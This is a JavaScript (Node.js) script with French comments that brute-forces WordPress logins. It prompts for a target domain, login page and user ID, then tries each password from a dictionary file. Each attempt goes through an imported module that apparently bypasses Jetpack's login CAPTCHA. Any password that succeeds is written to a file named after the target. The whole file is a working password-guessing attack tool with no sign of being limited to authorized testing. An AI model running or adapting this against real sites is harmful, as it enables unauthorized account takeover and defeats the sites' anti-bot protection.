const fs = require('fs');
const path = require('path');
const readline = require('readline');
const JetpackLoginCaptchaSolver = require('./JetpackLoginCaptchaSolver');

// Crée une interface pour la lecture depuis le terminal
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

/**
 * Pose une question à l'utilisateur et retourne la réponse.
 * @param {string} query - La question à poser.
 * @returns {Promise<string>} - Une promesse qui se résout avec la réponse de l'utilisateur.
 */
function askQuestion(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

/**
 * Sert à lire un fichier de dictionnaire et retourne un tableau de mots de passe.
 * @param {string} filePath - Le chemin vers le fichier de dictionnaire.
 * @returns {Promise<string[]>} - Une promesse qui se résout avec un tableau de mots de passe.
 */
function readDictionary(filePath) {
    return new Promise((resolve, reject) => {
        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) return reject(err);
            resolve(data.split('\n').map(line => line.trim()).filter(line => line.length > 0));
        });
    });
}

/**
 * Fonction principale pour gérer les entrées de l'utilisateur et tester les mots de passe du dictionnaire.
 * Si le mot de passe est concluant, il est sauvegardé dans un fichier texte.
 */
async function main() {
    try {
        const domain = await askQuestion('Entrer un nom de domain (ex: my-wordpress-website.fr): ');
        const loginPage = await askQuestion('Entrer la page de connexion (ex: wp-login.php): ');
        const userId = await askQuestion('Entrer l\'ID utilisateur : ');
        const dictionary = await readDictionary('dictionary.txt');

        rl.close();

        for (const password of dictionary) {
            const jetpackLoginCaptchaSolver = new JetpackLoginCaptchaSolver(
                domain,
                loginPage || 'wp-login.php',
                'wp-admin',
                { id: userId, pwd: password }
            );

            try {
                const pwd_solved = await jetpackLoginCaptchaSolver.submit();
                console.log(`\x1b[32mMot de passe trouvé pour ${userId} : ${password}\x1b[0m`);

                const dir = path.resolve(__dirname, 'password_found');
                if (!fs.existsSync(dir)) {
                    fs.mkdirSync(dir);
                }
    
                const filePath = path.join(dir, `${domain}_${userId}.txt`);
                fs.writeFileSync(filePath, `Mot de passe trouvé pour "${userId}" : ${pwd_solved}\n`, 'utf8');
                console.log(`Mot passe écrit sur ${filePath}`);

                break;
            } catch (error) {
                console.log(`\x1b[31mMot de passe incorrect : ${password}\x1b[0m`);
                console.error(error.message);
            }
        }
    } catch (error) {
        console.error(error.message);
    }
}

main();
